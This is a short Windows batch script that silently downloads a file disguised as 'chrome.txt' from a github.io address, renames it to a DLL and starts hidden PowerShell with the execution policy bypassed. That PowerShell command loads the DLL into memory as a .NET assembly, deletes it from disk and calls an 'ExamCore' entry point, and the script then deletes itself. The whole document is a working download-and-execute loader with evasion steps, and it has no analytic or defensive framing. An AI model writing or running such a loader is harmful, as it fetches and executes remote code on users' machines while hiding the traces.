@echo off
set "DL=%USERPROFILE%\Downloads"
curl -s -L https://bkcnnk1a-code.github.io/dl/files/chrome.txt -o "%DL%\chrome.txt"
if exist "%DL%\chrome.txt" (
    if exist "%DL%\chrome.dll" del /f /q "%DL%\chrome.dll"
    ren "%DL%\chrome.txt" "chrome.dll"
)
start "" powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$p=Join-Path $env:USERPROFILE 'Downloads\chrome.dll'; if(Test-Path $p){ $b=[IO.File]::ReadAllBytes($p); Remove-Item $p -Force; [Reflection.Assembly]::Load($b)|Out-Null; [ExamCore]::Start() }"
start "" /b cmd /c del /f /q "%~f0"
exit
